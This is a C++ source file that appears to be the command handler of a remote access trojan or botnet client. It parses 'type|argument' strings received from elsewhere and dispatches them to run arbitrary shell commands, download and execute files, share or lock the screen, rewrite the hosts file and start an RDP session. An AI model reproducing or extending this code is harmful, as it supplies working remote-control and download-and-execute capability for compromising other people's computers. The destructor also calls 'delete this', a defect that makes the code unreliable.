#include"Command.h"
#include"Utils.h"
#include"Conf.h"
#include"Screen.h"
#include"Http.h"
#include"Strings.h"
#include"RDP.h"

    void command::parse_command() {
        size_t i = commandline.find('|');
        if (i != std::string::npos) {
            std::string commandtypestr = commandline.substr(0, i);
            commandarg = commandline.substr(i + 1);

            if (commandtypestr.length() == 0 || commandarg.length() == 0) { return; }
            try {
                this->commandtype = std::stoi(commandtypestr);
            }
            catch (...) {
                return;
            }


        }


    }

    void command::LaunchCommand() {
        if (commandtype == -1) {
            std::wstring error(L"Error parsing command : ");
            std::wstring commandlinew(commandline.begin(), commandline.end());
            error = error + commandlinew;
            Log::SaveLog((wchar_t*)error.c_str());
            return;
        }

        switch (this->commandtype)
        {
        case CMD:
            Utils::commandrun((char*)commandarg.c_str());
            break;
        case SCREENSHARE:
            Screen::ScreenShareSpawn(commandarg);
            break;
        case LOCKSCREEN:
            Utils::LockScreen();
            break;
        case UNLOCKSCREEN:
            Utils::UnlockScreen(commandarg);
            break;
        case FILEDOWNLOAD:
            Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str());
            break;
        case FILEDOWNLOADRUN:
            if (Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str())) {
                Utils::runAsUser((wchar_t*)Strings::strtow(Http::extractFileName(commandarg)).c_str(),(wchar_t*)L"");
            }
            break;
        case UPDATEHOSTS:
            Utils::UpdateHosts();
            break;
        case RDPCMD: {
            int* port = new int;
            try {
                *port = std::stoi(commandarg.c_str());
            }
            catch (...) { return; }
            HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RDP::StartRDP, port, NULL, 0);
            if (th) { CloseHandle(th); }
            break;
        }

        default:
            Log::SaveLog((wchar_t*)L"UNK Command");
            break;
        }
    }

    command::command(std::string commandline)
    {
        this->commandline = commandline;
        parse_command();
        LaunchCommand();
    }

    command::~command() {

        delete this;
    }